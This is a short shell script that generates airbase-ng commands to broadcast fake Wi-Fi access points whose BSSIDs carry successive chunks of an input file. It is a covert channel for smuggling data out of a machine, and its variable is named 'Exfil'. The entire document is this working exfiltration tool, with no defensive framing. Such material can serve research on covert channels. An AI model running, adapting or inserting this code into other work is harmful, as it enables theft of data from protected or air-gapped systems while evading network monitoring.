 #!/bin/sh
echo " #!/bin/sh"
for bytes in `xxd -p -c 5 $1 | sed 's/../&:/g'`; 
 do
   Exfil=`echo $bytes | sed 's/:$/ /'`
   text=`echo $Exfil | xxd -r -p`
   echo "#Injecting text: " \"$text\" "to Mac via BSSID" 00:$Exfil "for FAKE AccessPoint: " $2  
   echo "airbase-ng -a " 00:$Exfil  " --essid" $2 "-I 10 -0 " $3 " ;"
   echo  
 done
